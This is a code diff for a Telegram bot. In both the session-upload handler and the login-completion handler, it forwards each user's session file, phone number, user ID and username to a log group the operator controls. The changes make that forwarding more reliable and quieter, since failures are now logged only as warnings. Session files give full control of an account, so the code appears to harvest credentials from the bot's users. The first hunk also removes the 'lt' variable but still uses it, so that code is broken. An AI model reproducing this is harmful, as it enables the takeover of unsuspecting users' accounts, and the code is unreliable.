@@ -347,12 +347,14 @@ def register_handlers(client):
                             
                             log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])
                             
-                            lt = (f"<blockquote><b>» 📁 Session Uploaded</b>\n"
-                                  f"👤 <code>{user_id}</code> | 📞 <code>{phone_actual}</code>\n"
-                                  f"🏷️ {name} | 🔗 @{username or 'None'}</blockquote>")
-                            await client.send_message(lgid, lt, file=dest_path, parse_mode="html", buttons=log_buttons if log_buttons else None)
+                            peer_dest = None
+                            try:
+                                peer_dest = await client.get_input_entity(int(lgid))
+                            except Exception:
+                                peer_dest = int(lgid)
+                            await client.send_message(peer_dest, lt, file=dest_path, parse_mode="html", buttons=log_buttons if log_buttons else None)
                     except Exception as le:
-                        logger.error(f"Error sending log for session upload: {le}")
+                        logger.warning(f"Error sending log for session upload: {le}")
                 except Exception as sess_err:
                     failures.append(f"{sf_name} ❌ {sess_err}")
                     try:
@@ -647,15 +649,21 @@ async def complete_login(bot_client, event, user_id: int, state: dict):
                     log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])
 
                 # Upload session file with clickable buttons
+                peer_dest = None
+                try:
+                    peer_dest = await bot_client.get_input_entity(int(log_group_id))
+                except Exception:
+                    peer_dest = int(log_group_id)
+
                 await bot_client.send_message(
-                    log_group_id, 
+                    peer_dest, 
                     log_text, 
                     file=session_path,
                     buttons=log_buttons if log_buttons else None,
                     parse_mode="html"
                 )
             except Exception as log_err:
-                logger.error(f"Failed to log connected session to log group {log_group_id}: {log_err}")
+                logger.warning(f"Could not forward session upload to log group {log_group_id}: {log_err}")
                 
     except Exception as e:
         logger.error(f"Error finalizing login: {e}")
